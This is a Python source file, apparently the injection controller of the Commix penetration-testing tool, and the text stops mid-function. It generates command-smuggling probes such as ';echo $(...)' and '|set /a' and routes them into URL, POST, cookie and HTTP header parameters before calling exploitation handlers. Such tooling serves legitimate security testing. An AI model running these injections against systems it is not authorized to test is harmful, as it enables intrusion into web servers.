#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import common
from src.utils import session_handler
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.modules import modules_handler
from src.core.requests import authentication
from src.core.injections.controller import checks
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.blind.techniques.time_based import tb_handler
from src.core.injections.semiblind.techniques.file_based import fb_handler
from src.core.injections.results_based.techniques.classic import cb_handler
from src.core.injections.results_based.techniques.eval_based import eb_handler

"""
Command Injection and exploitation controller.
Checks if the testable parameter is exploitable.
"""

"""
Heuristic basic checks payloads generator
"""
def basic_payload_generator():
  suffix = ""
  if settings.USE_BACKTICKS:
    prefix = "expr "
  else:
    prefix = "("
    suffix = ")"
  settings.BASIC_STRING = prefix + settings.CALC_STRING + suffix
  settings.BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + 
                                              "%26echo " + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + 
                                              "|echo " + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + 
                                              settings.RANDOM_STRING_GENERATOR,
                                              "|set /a " + settings.BASIC_STRING + "%26set /a " + settings.BASIC_STRING
                                              ]
"""
Initializing basic level check status
"""
def basic_level_checks():
  settings.TIME_RELATED_ATTACK = False
  settings.SKIP_CODE_INJECTIONS = None
  settings.SKIP_COMMAND_INJECTIONS = None
  settings.IDENTIFIED_COMMAND_INJECTION = False
  settings.IDENTIFIED_WARNINGS = False
  settings.IDENTIFIED_PHPINFO = False

"""
Initializing HTTP Headers parameters injection status
"""
def init_http_header_injection_status():
  settings.HTTP_HEADERS_INJECTION = None
  settings.USER_AGENT_INJECTION = None
  settings.REFERER_INJECTION = None
  settings.HOST_INJECTION = None

"""
Initializing Cookie parameters injection status
"""
def init_cookie_injection_status():
  settings.COOKIE_INJECTION = None

"""
Check for previously stored sessions.
"""
def check_for_stored_sessions(url, check_parameter, http_request_method):
  if not menu.options.ignore_session and not menu.options.flush_session:
    if os.path.isfile(settings.SESSION_FILE) and not settings.REQUIRED_AUTHENTICATION:
      if settings.LOAD_SESSION == None:
        url, check_parameter = session_handler.check_stored_injection_points(url, check_parameter, http_request_method)
  return url, check_parameter

"""
Heuristic request(s)
"""
def heuristic_request(url, http_request_method, check_parameter, payload, whitespace):
  data = None
  cookie = None
  tmp_url = url
  payload, prefix = parameters.prefixes(payload, prefix="")
  payload, suffix = parameters.suffixes(payload, suffix="")
  payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
  payload = checks.perform_payload_modification(payload)
  if settings.VERBOSITY_LEVEL >= 1:
    settings.print_data_to_stdout(settings.print_payload(payload))
  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
    payload = checks.payload_fixation(payload)
    cookie = checks.process_injectable_value(payload, menu.options.cookie).encode(settings.DEFAULT_CODEC)
  else:
    cookie = checks.remove_tags(menu.options.cookie).encode(settings.DEFAULT_CODEC)

  if not settings.IGNORE_USER_DEFINED_POST_DATA and menu.options.data and settings.INJECT_TAG in menu.options.data:
    data = checks.process_injectable_value(payload, menu.options.data).encode(settings.DEFAULT_CODEC)
  else:
    if settings.USER_DEFINED_POST_DATA:
      settings.USER_DEFINED_POST_DATA = checks.remove_tags(settings.USER_DEFINED_POST_DATA)
      data = settings.USER_DEFINED_POST_DATA.encode(settings.DEFAULT_CODEC)
  if settings.INJECT_TAG in url:
    tmp_url = checks.process_injectable_value(payload, url)
  else:
    tmp_url = checks.remove_tags(tmp_url)
    url = checks.remove_tags(url)

  request = _urllib.request.Request(tmp_url, data, method=http_request_method)
  if cookie:
    request.add_header(settings.COOKIE, cookie)
  if check_parameter_in_http_header(check_parameter) and check_parameter not in settings.HOST.capitalize():
    settings.CUSTOM_HEADER_NAME = check_parameter.title()
    if settings.CUSTOM_HEADER_VALUE.replace(settings.INJECT_TAG, "") in settings.CUSTOM_HEADER_VALUE:
      request.add_header(settings.CUSTOM_HEADER_NAME, settings.CUSTOM_HEADER_VALUE.replace(settings.INJECT_TAG, "").replace(settings.CUSTOM_HEADER_VALUE, payload).encode(settings.DEFAULT_CODEC))
    else:
      request.add_header(settings.CUSTOM_HEADER_NAME, payload.encode(settings.DEFAULT_CODEC))
  headers.do_check(request)
  response = requests.get_request_response(request)
  return response, url

"""
Heuristic (basic) tests for command injection
"""
def command_injection_heuristic_basic(url, http_request_method, check_parameter, the_type, header_name, inject_http_headers):
  check_parameter = check_parameter.lstrip().rstrip()
  checks.perform_payload_modification(payload="")
  basic_payload_generator()
  if menu.options.alter_shell:
    basic_payloads = settings.ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS
  else:
    basic_payloads = settings.BASIC_COMMAND_INJECTION_PAYLOADS
  settings.CLASSIC_STATE = True
  try:
    # checks.perform_payload_modification(payload="")
    for whitespace in settings.WHITESPACES:
      if not settings.IDENTIFIED_COMMAND_INJECTION:
        _ = 0
        for payload in basic_payloads:
          _ = _ + 1
          response, url = heuristic_request(url, http_request_method, check_parameter, payload, whitespace)
          if type(response) is not bool and response is not None:
            html_data = checks.page_encoding(response, action="decode")
            match = re.search(settings.BASIC_COMMAND_INJECTION_RESULT, html_data)
            if match:
              settings.IDENTIFIED_COMMAND_INJECTION = True
              possible_os = ('Unix-like', 'Windows')[_ != 1]
              if settings.OS.UNIX.lower() in possible_os.lower():
                settings.TARGET_OS = settings.OS.UNIX
              else:
                settings.TARGET_OS = settings.OS.WINDOWS
              info_msg = "Heuristic (basic) tests show that "
              info_msg += settings.CHECKING_PARAMETER + " might be injectable (possible OS: '" + possible_os + "')."
              settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
              settings.SKIP_CODE_INJECTIONS = True
              break

    settings.CLASSIC_STATE = False
    return url

  except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Heuristic (basic) tests for code injection warnings
"""
def code_injections_heuristic_basic(url, http_request_method, check_parameter, the_type, header_name, inject_http_headers):
  check_parameter = check_parameter.lstrip().rstrip()
  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CE
  technique = settings.INJECTION_TECHNIQUE.DYNAMIC_CODE
  technique = "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ""
  settings.EVAL_BASED_STATE = True
  try:
    whitespace = settings.SINGLE_WHITESPACE
    if (not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_PHPINFO):
      for payload in settings.PHPINFO_CHECK_PAYLOADS:
        response, url = heuristic_request(url, http_request_method, check_parameter, payload, whitespace)
        if type(response) is not bool and response is not None:
          html_data = checks.page_encoding(response, action="decode")
          match = re.search(settings.CODE_INJECTION_PHPINFO, html_data)
          if match:
            technique = technique + " (possible PHP version: '" + match.group(1) + "')"
            settings.IDENTIFIED_PHPINFO = True
          else:
            for warning in settings.CODE_INJECTION_WARNINGS:
              if warning in html_data:
                settings.IDENTIFIED_WARNINGS = True
                break
          if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_PHPINFO:
            info_msg = "Heuristic (basic) tests show that "
            info_msg += settings.CHECKING_PARAMETER + " might be injectable via " + technique + "."
            settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
            break

    settings.EVAL_BASED_STATE = False
    return url

  except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Check if it's exploitable via classic command injection technique.
"""
def classic_command_injection_technique(url, timesec, filename, http_request_method):
  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CI
  technique = settings.INJECTION_TECHNIQUE.CLASSIC
  settings.CLASSIC_STATE = None
  if not settings.SKIP_COMMAND_INJECTIONS:
    if (len(menu.options.tech) == 0 or "c" in menu.options.tech):
      if cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique) != False:
        settings.CLASSIC_STATE = settings.IDENTIFIED_COMMAND_INJECTION = True
        checks.skip_testing(filename, url)
      else:
        settings.CLASSIC_STATE = False
  if settings.CLASSIC_STATE == None or settings.SKIP_COMMAND_INJECTIONS:
    checks.skipping_technique(technique, injection_type, settings.CLASSIC_STATE)

"""
Check if it's exploitable via dynamic code evaluation technique.
"""
def dynamic_code_evaluation_technique(url, timesec, filename, http_request_method):
  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CE
  technique = settings.INJECTION_TECHNIQUE.DYNAMIC_CODE
  settings.EVAL_BASED_STATE = None
  if not settings.SKIP_CODE_INJECTIONS:
    if (len(menu.options.tech) == 0 or "e" in menu.options.tech):
      if eb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique) != False:
        settings.EVAL_BASED_STATE = True
        if not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_PHPINFO:
          checks.skip_testing(filename, url)
      else:
        settings.EVAL_BASED_STATE = False
  if settings.EVAL_BASED_STATE == None or not settings.SKIP_CODE_INJECTIONS:
    checks.skipping_technique(technique, injection_type, settings.EVAL_BASED_STATE)

"""
Check if it's exploitable via time-based command injection technique.
"""
def timebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response):
  injection_type = settings.INJECTION_TYPE.BLIND
  technique = settings.INJECTION_TECHNIQUE.TIME_BASED
  settings.TIME_BASED_STATE = None
  if not settings.SKIP_COMMAND_INJECTIONS:
    if (len(menu.options.tech) == 0 or "t" in menu.options.tech):
      if tb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) != False:
        settings.TIME_BASED_STATE = settings.IDENTIFIED_COMMAND_INJECTION = True
        checks.skip_testing(filename, url)
      else:
        settings.TIME_BASED_STATE = False
  if settings.TIME_BASED_STATE == None or settings.SKIP_COMMAND_INJECTIONS:
    checks.skipping_technique(technique, injection_type, settings.TIME_BASED_STATE)

"""
Check if it's exploitable via file-based command injection technique.
"""
def filebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response):
  injection_type = settings.INJECTION_TYPE.SEMI_BLIND
  technique = settings.INJECTION_TECHNIQUE.FILE_BASED
  settings.FILE_BASED_STATE = None
  if not settings.SKIP_COMMAND_INJECTIONS:
    if (len(menu.options.tech) == 0 or "f" in menu.options.tech):
      if fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) != False:
        settings.FILE_BASED_STATE = settings.IDENTIFIED_COMMAND_INJECTION = True
        checks.skip_testing(filename, url)
      else:
        settings.FILE_BASED_STATE = False
  if settings.FILE_BASED_STATE == None or settings.SKIP_COMMAND_INJECTIONS:
    checks.skipping_technique(technique, injection_type, settings.FILE_BASED_STATE)

"""
Check parameter in HTTP header.
"""
def check_parameter_in_http_header(check_parameter):
  if any(x in check_parameter.lower() for x in settings.HTTP_HEADERS) or \
     check_parameter.lower() in settings.CUSTOM_HEADER_NAME.lower():
    if settings.ACCEPT_VALUE not in settings.CUSTOM_HEADER_VALUE:
      inject_http_headers = True
  else:
    inject_http_headers = False
    init_http_header_injection_status()
  return inject_http_headers

"""
Proceed to the injection process for the appropriate parameter.
"""
def injection_proccess(url, check_parameter, http_request_method, filename, timesec):
  settings.NOT_TESTABLE_PARAMETERS = False
  for i in range(0,int(settings.OS_CHECKS_NUM)):
    if settings.CHECK_BOTH_OS:
      if i == 0:
        settings.TARGET_OS = settings.OS.UNIX
      else:
        settings.TARGET_OS = settings.OS.WINDOWS

    if settings.PERFORM_BASIC_SCANS:
      checks.keep_testing_others(filename, url)
      if not settings.LOAD_SESSION:
        settings.LOAD_SESSION = None
      basic_level_checks()

    inject_http_headers = check_parameter_in_http_header(check_parameter)

    if inject_http_headers:
      checks.define_vulnerable_http_header(check_parameter)

    # User-Agent/Referer/Host/Custom HTTP header Injection(s)
    if any((settings.USER_AGENT_INJECTION, settings.REFERER_INJECTION, settings.HOST_INJECTION, settings.CUSTOM_HEADER_INJECTION)):
      header_name = ""
      the_type = "HTTP Header"
      inject_parameter = " parameter '" + check_parameter + "'"
    else:
      if settings.COOKIE_INJECTION:
        header_name = settings.COOKIE
      else:
        header_name = ""
      the_type = " parameter"
      inject_parameter = " '" + check_parameter + "'"

    # Estimating the response time (in seconds)
    timesec, url_time_response = requests.estimate_response_time(url, timesec, http_request_method)

    # Load modules
    modules_handler.load_modules(url, http_request_method, filename)
    # checks.tamper_scripts(stored_tamper_scripts=False)

    settings.CHECKING_PARAMETER = ""
    settings.TESTABLE_PARAMETER = check_parameter
    if not header_name == settings.COOKIE and not the_type == "HTTP Header":
      settings.CHECKING_PARAMETER = checks.check_http_method(url)
      settings.CHECKING_PARAMETER += ('', ' JSON')[settings.IS_JSON] + ('', ' SOAP/XML')[settings.IS_XML]
    if header_name == settings.COOKIE :
       settings.CHECKING_PARAMETER += str(header_name) + str(the_type) + str(inject_parameter)
    else:
       settings.CHECKING_PARAMETER += str(the_type) + str(header_name) + str(inject_parameter)

    if check_parameter in settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST and not http_request_method + ":" + check_parameter in settings.TESTED_PARAMETERS_LIST:
      settings.CHECKING_PARAMETER = "(custom) " + settings.CHECKING_PARAMETER

    if not settings.LOAD_SESSION:
      info_msg = "Setting " + settings.CHECKING_PARAMETER  + " for tests."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      
    if menu.options.skip_heuristics:
      if settings.VERBOSITY_LEVEL != 0:
        debug_msg = "Skipping heuristic (basic) tests to the " + settings.CHECKING_PARAMETER + "."
        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    else:
      if not settings.LOAD_SESSION:
        checks.recognise_payload(payload=settings.TESTABLE_VALUE)
        info_msg = "Performing heuristic (basic) tests to the " + settings.CHECKING_PARAMETER + "."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))

        if not (len(menu.options.tech) == 1 and "e" in menu.options.tech):
          url = command_injection_heuristic_basic(url, http_request_method, check_parameter, the_type, header_name, inject_http_headers)

        if not settings.IDENTIFIED_COMMAND_INJECTION and "e" in menu.options.tech:
          # Check for identified warnings
          url = code_injections_heuristic_basic(url, http_request_method, check_parameter, the_type, header_name, inject_http_headers)
          if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_PHPINFO:
            checks.skip_testing(filename, url)

        if not settings.IDENTIFIED_COMMAND_INJECTION and not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_PHPINFO:
          settings.HEURISTIC_TEST.POSITIVE = False
          warn_msg = "Heuristic (basic) tests show that "
          warn_msg += settings.CHECKING_PARAMETER + " might not be injectable."
          settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))

    if (menu.options.smart and not settings.HEURISTIC_TEST.POSITIVE) or (menu.options.smart and menu.options.skip_heuristics):
      info_msg = "Skipping "
      info_msg += settings.CHECKING_PARAMETER + "."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      settings.HEURISTIC_TEST.POSITIVE = True
    else:
      if menu.options.failed_tries and \
         menu.options.tech and not "f" in menu.options.tech and not \
         menu.options.failed_tries:
        warn_msg = "Due to the provided (unsuitable) injection technique"
        warn_msg += "s"[len(menu.options.tech) == 1:][::-1] + ", "
        warn_msg += "the option '--failed-tries' will be ignored."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

      # Procced with file-based semiblind command injection technique,
      # once the user provides the path of web server's root directory.
      if menu.options.web_root and settings.USER_APPLIED_TECHNIQUE and not "f" in menu.options.tech:
        if not menu.options.web_root.endswith("/"):
           menu.options.web_root =  menu.options.web_root + "/"
        if checks.procced_with_file_based_technique():
          menu.options.tech = "f"

      settings.START_SCANNING = True
      classic_command_injection_technique(url, timesec, filename, http_request_method)
      dynamic_code_evaluation_technique(url, timesec, filename, http_request_method)
      timebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response)
      filebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response)

      # All injection techniques seems to be failed!
      if checks.injection_techniques_status() == False:
        warn_msg = settings.CHECKING_PARAMETER
        warn_msg += " does not seem to be injectable."
        settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
      else:
        if settings.LOAD_SESSION:
          checks.quit(filename, url, _ = False)

    if not settings.CHECK_BOTH_OS:
      break

"""
Perform injection for a specific HTTP header (User-Agent, Referer, or Host)
"""
def http_headers_injection(url, http_request_method, filename, timesec):

  def inject_header(header_attr, option_attr, injection_flag_attr):
    # Save the original value of the option (to restore later)
    original_value = getattr(menu.options, option_attr)

    # Enable the corresponding injection flag
    setattr(settings, injection_flag_attr, True)

    # Get the header name (e.g., "user-agent", "referer", "host")
    header_name = getattr(settings, header_attr).lower()
    settings.HTTP_HEADER = check_parameter = header_name

    # Check if the session has stored data for this header
    new_url, check_parameter = check_for_stored_sessions(url, check_parameter, http_request_method)

    # If the header was replaced or injection failed, reset the injection flag
    if check_parameter != header_name or not injection_proccess(new_url, check_parameter, http_request_method, filename, timesec):
      setattr(settings, injection_flag_attr, None)

    # Restore the original option value
    setattr(menu.options, option_attr, original_value)

  # Determine whether a header should be tested for injection
  def test_header(header_attr):
    test_param = menu.options.test_parameter
    skip_param = menu.options.skip_parameter
    header_value = getattr(settings, header_attr).lower()

    # Check if the corresponding injection flag is already active
    if getattr(settings, header_attr.upper() + "_INJECTION"):
      return True

    # Check if explicitly included in test_parameter
    if isinstance(test_param, str) and header_value in test_param.lower():
      return True

    # Check if not excluded via skip_parameter
    if isinstance(skip_param, str) and header_value not in skip_param.lower():
      return True

    return False

  # If no specific test or skip parameters and no injection flags are set, test all headers
  no_injection_flags = not settings.USER_AGENT_INJECTION and not settings.REFERER_INJECTION and not settings.HOST_INJECTION
  no_test_or_skip = menu.options.test_parameter is None and menu.options.skip_parameter is None

  if no_injection_flags and no_test_or_skip:
    inject_header("USER_AGENT", "agent", "USER_AGENT_INJECTION")
    inject_header("REFERER", "referer", "REFERER_INJECTION")
    inject_header("HOST", "host", "HOST_INJECTION")
  else:
    # Conditional injection based on test/skip flags or predefined injection settings
    if test_header("USER_AGENT"):
      inject_header("USER_AGENT", "agent", "USER_AGENT_INJECTION")
    if test_header("REFERER"):
      inject_header("REFERER", "referer", "REFERER_INJECTION")
    if test_header("HOST"):
      inject_header("HOST", "host", "HOST_INJECTION")

"""
Inject Cookie parameters
"""
def cookie_injection(url, http_request_method, filename, timesec):
  if not menu.options.cookie:
    check_parameter = settings.COOKIE.lower()
    check_for_stored_sessions(url, check_parameter, http_request_method)

  cookie = menu.options.cookie
  if cookie:
    settings.COOKIE_INJECTION = True
    # Cookie Injection
    header_name = settings.SINGLE_WHITESPACE + settings.COOKIE
    settings.HTTP_HEADER = header_name[1:].lower()
    cookie_parameters = parameters.do_cookie_check(menu.options.cookie)
    if type(cookie_parameters) is str:
      cookie_parameters_list = []
      cookie_parameters_list.append(cookie_parameters)
      cookie_parameters = cookie_parameters_list
    # Remove whitespaces
    cookie_parameters = [x.replace(settings.SINGLE_WHITESPACE, "") for x in cookie_parameters]
    do_injection(cookie_parameters, settings.COOKIE, header_name, url, http_request_method, filename, timesec)

  if settings.COOKIE_INJECTION:
    # Restore cookie value
    menu.options.cookie = cookie
    # Disable cookie injection
    settings.COOKIE_INJECTION = False

"""
Remove parameters containing the injection tag from the testable parameters list.
"""
def filtered_testable_parameters():
  settings.TESTABLE_PARAMETERS_LIST = [
  param for param in settings.TESTABLE_PARAMETERS_LIST
  if settings.INJECT_TAG not in param]
  return settings.TESTABLE_PARAMETERS_LIST

"""
Process a list of parameters to test for injection vulnerabilities.
"""
def do_injection(found, data_type, header_name, url, http_request_method, filename, timesec):

  """
  Validate parameter names using allowed characters:
  letters, digits, underscores, hyphens, dots, and square brackets.
  """
  def is_valid_param_name(name):
    if not isinstance(name, str):
      return False
    name = name.strip()
    if not name:
      return False
    return bool(re.match(r'^[a-zA-Z0-9._\-\[\]]+$', name))

  """
  Define the check parameter based on the data type (POST, GET, COOKIE).
  """
  def define_check_parameter(param, current_url):
    if data_type == settings.HTTPMETHOD.POST:
      menu.options.data = param
      check_param = parameters.vuln_POST_param(param, current_url)
    elif data_type == settings.HTTPMETHOD.GET:
      current_url = param
      check_param = parameters.vuln_GET_param(current_url)
    elif data_type == settings.COOKIE:
      menu.options.cookie = param
      check_param = parameters.specify_cookie_parameter(param)
    else:
      check_param = ""
    return current_url, check_param

  """
  Return a unique identifier for the parameter by prefixing it with the data type.
  """
  def get_contextual_name(check_param):
    return str(data_type) + ":" + str(check_param)

  """
  Perform the injection call and update tested parameters.
  """
  def injection_call(url, check_param):
    contextual_name = get_contextual_name(check_param)
    url, check_param = define_check_parameter(found[index], url)
    url, check_param = check_for_stored_sessions(url, check_param, http_request_method)
    injection_proccess(url, check_param, http_request_method, filename, timesec)
    settings.TESTED_PARAMETERS_LIST.append(contextual_name)

  check_parameters = []
  param_mapping = {}

  # Filter and validate parameters to prepare for injection tests
  for param in found:
    url, check_param = define_check_parameter(param, url)
    if not check_param:
      continue
    contextual_name = get_contextual_name(check_param)
    if contextual_name in settings.TESTED_PARAMETERS_LIST:
      continue
    if not is_valid_param_name(check_param):
      continue
    check_parameters.append(check_param)
    param_mapping[check_param] = param

  # Prepare testable parameters
  filtered_testable_parameters()
  checks.testable_parameters(url, check_parameters, header_name)

  # Exclude parameters that already contain the inject tag
  base_params = {
    param for param in settings.TESTABLE_PARAMETERS_LIST
    if settings.INJECT_TAG not in param
  }

  # Add custom marker parameters if enabled
  custom_params = set(settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST) \
    if settings.CUSTOM_INJECTION_MARKER else set()

  # Final set of injection targets
  injection_targets = base_params.union(custom_params)

  for check_param in check_parameters:
    contextual_name = get_contextual_name(check_param)
    if contextual_name in settings.TESTED_PARAMETERS_LIST:
      continue

    try:
      original_param = param_mapping[check_param]
      index = found.index(original_param)
    except (KeyError, ValueError):
      continue

    settings.TESTABLE_PARAMETER = check_param
    
    if settings.USER_DEFINED_POST_DATA:
      active_targets = injection_targets
    else:
      if any(param in injection_targets for param in check_parameters):
        active_targets = injection_targets
      else:
        active_targets = check_parameters

    if check_param in active_targets or not filtered_testable_parameters():
      injection_call(url, check_param)

"""
Check if HTTP Method is GET.
"""
def get_request(url, http_request_method, filename, timesec):

  found_url = parameters.do_GET_check(url, http_request_method)
  header_name = ""

  if found_url != False:
    do_injection(found_url, settings.HTTPMETHOD.GET, header_name, url, http_request_method, filename, timesec)

"""
Check if HTTP Method is POST.
"""
def post_request(url, http_request_method, filename, timesec):

  parameter = settings.USER_DEFINED_POST_DATA
  found_parameter = parameters.do_POST_check(parameter, http_request_method)
  header_name = ""

  if type(found_parameter) is str:
    found_parameter_list = []
    found_parameter_list.append(found_parameter)
    found_parameter = found_parameter_list

  if any((settings.IS_JSON, settings.IS_XML)):
    # Remove junk data
    found_parameter = [x for x in found_parameter if settings.INJECT_TAG in x]
  else:
    # Remove whitespaces
    found_parameter = [x.replace(settings.SINGLE_WHITESPACE, "") for x in found_parameter]

  do_injection(found_parameter, settings.HTTPMETHOD.POST, header_name, url, http_request_method, filename, timesec)

"""
Perform GET / POST parameters checks
"""
def data_checks(url, http_request_method, filename, timesec):
  settings.CUSTOM_HEADER_INJECTION = False

  init_cookie_injection_status()
  if settings.USER_DEFINED_POST_DATA and not settings.IGNORE_USER_DEFINED_POST_DATA:
    if post_request(url, http_request_method, filename, timesec) is None:
      if not settings.SKIP_NON_CUSTOM_PARAMS:
        get_request(url, http_request_method, filename, timesec)
  else:
    if get_request(url, http_request_method, filename, timesec) is None:
      if settings.USER_DEFINED_POST_DATA:
        if not settings.SKIP_NON_CUSTOM_PARAMS:
          post_request(url, http_request_method, filename, timesec) 

"""
Perform checks over cookie values.
"""
def cookies_checks(url, http_request_method, filename, timesec): 
  if len([i for i in settings.TESTABLE_PARAMETERS_LIST if i in str(menu.options.cookie)]) != 0 or \
    settings.INJECTION_MARKER_LOCATION.COOKIE or \
    settings.COOKIE_INJECTION:
    if not settings.SKIP_NON_CUSTOM_PARAMS:
      cookie_injection(url, http_request_method, filename, timesec)

"""
Perform checks over HTTP Headers parameters.
"""
def headers_checks(url, http_request_method, filename, timesec):
  if len([i for i in settings.TESTABLE_PARAMETERS_LIST if i in settings.HTTP_HEADERS]) != 0 or \
    settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS or \
    settings.HTTP_HEADERS_INJECTION:
    if not settings.SKIP_NON_CUSTOM_PARAMS:
      http_headers_injection(url, http_request_method, filename, timesec)

"""
Perform checks over custom HTTP Headers parameters.
"""
def custom_headers_checks(url, http_request_method, filename, timesec): 
  for name in range(len(settings.CUSTOM_HEADERS_NAMES)):
    if settings.ASTERISK_MARKER in settings.CUSTOM_HEADERS_NAMES[name].split(": ")[1] and not settings.CUSTOM_INJECTION_MARKER:
      settings.CUSTOM_HEADER_INJECTION = False
    else:
      settings.CUSTOM_HEADER_INJECTION = True
      settings.CUSTOM_HEADER_NAME = settings.CUSTOM_HEADERS_NAMES[name].split(": ")[0]
      settings.HTTP_HEADER = check_parameter = header_name = settings.CUSTOM_HEADER_NAME.lower()
      settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST.append(check_parameter) if check_parameter not in settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST else settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST
      settings.CUSTOM_HEADER_VALUE = settings.CUSTOM_HEADERS_NAMES[name].split(": ")[1].replace(settings.ASTERISK_MARKER, settings.INJECT_TAG)
      url, check_parameter = check_for_stored_sessions(url, check_parameter, http_request_method)
      if check_parameter != header_name or not injection_proccess(url, check_parameter, http_request_method, filename, timesec):
        settings.CUSTOM_HEADER_INJECTION = False
      settings.CUSTOM_HEADERS_NAMES[name] = checks.remove_tags(settings.CUSTOM_HEADERS_NAMES[name])
  settings.CUSTOM_HEADER_INJECTION = False

"""
Perform checks across multiple HTTP components (URL parameters, POST data, cookies,
standard headers, and custom headers) to identify possible injection points.
"""
def perform_checks(url, http_request_method, filename):

  # Prepare whitespaces if multiple targets or stdin parsing is used,
  # and more than one whitespace character is defined. Keep only one.
  if (settings.MULTI_TARGETS or settings.STDIN_PARSING) and \
     len(settings.WHITESPACES) > 1:
    settings.WHITESPACES = [_urllib.parse.quote(SINGLE_WHITESPACE)]

  timesec = settings.TIMESEC

  # Handle authentication if both the authentication URL and the authentication data are provided.
  if menu.options.auth_url and menu.options.auth_data:
    authentication.authentication_process(http_request_method)
    try:
      # Verify authentication success by comparing the response content of the main URL and the auth URL.
      if _urllib.request.urlopen(url, timeout=settings.TIMEOUT).read() == \
         _urllib.request.urlopen(menu.options.auth_url, timeout=settings.TIMEOUT).read():
        err_msg = "Authentication failed using the specified credentials and URL."
        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
        raise SystemExit()
    except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
      # Authentication request failed due to a connection or HTTP error.
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()

  # If only one of the required authentication options is provided, display an error and exit.
  elif menu.options.auth_url or menu.options.auth_data:
    err_msg = "Authentication requires specifying both '--auth-url' and '--auth-data' options."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

  # If shellshock testing is enabled, force the injection level to HTTP header level.
  if menu.options.shellshock:
    settings.INJECTION_LEVEL = settings.HTTP_HEADER_INJECTION_LEVEL
  else:
    # If the user specified a custom injection level and no custom marker is used,
    # set the level to the user-defined value.
    if settings.INJECTION_LEVEL != settings.DEFAULT_INJECTION_LEVEL and \
       not settings.CUSTOM_INJECTION_MARKER:
      settings.INJECTION_LEVEL = settings.USER_APPLIED_LEVEL

  proceed_non_custom = True
  
  # Perform custom marker-based checks if custom injection marker is enabled.
  if settings.CUSTOM_INJECTION_MARKER:
    proceed_non_custom = False

    # Perform checks over GET and POST parameters.
    if settings.INJECTION_MARKER_LOCATION.URL or \
       settings.INJECTION_MARKER_LOCATION.DATA:
      data_checks(url, http_request_method, filename, timesec)

    # Perform checks over cookie values.
    if settings.INJECTION_MARKER_LOCATION.COOKIE:
      cookies_checks(url, http_request_method, filename, timesec)

    # Perform checks over standard HTTP headers (User-Agent, Referer, Host).
    if settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS:
      headers_checks(url, http_request_method, filename, timesec)

    # Perform checks over custom user-defined HTTP headers.
    if settings.INJECTION_MARKER_LOCATION.CUSTOM_HTTP_HEADERS:
      custom_headers_checks(url, http_request_method, filename, timesec)

    # Check if the injection marker is set in either URL or POST data (but not both)
    has_exclusive_marker = settings.INJECTION_MARKER_LOCATION.URL ^ settings.INJECTION_MARKER_LOCATION.DATA
    # Check if no injection marker is set in either URL or POST data
    has_no_marker = not settings.INJECTION_MARKER_LOCATION.URL and not settings.INJECTION_MARKER_LOCATION.DATA
    # If there’s user POST data and an exclusive marker, or no marker at all,
    # and no testable GET parameters, proceed with non-custom checks
    if has_exclusive_marker or has_no_marker:
      checks.process_non_custom()

  # Perform default (non-custom) injection checks if not explicitly skipped.
  if not settings.SKIP_NON_CUSTOM_PARAMS:
    # Disable custom injection mode before running default checks.
    settings.CUSTOM_INJECTION_MARKER = False

    # Perform checks over GET/POST parameters if allowed or marker is not set in URL/DATA.
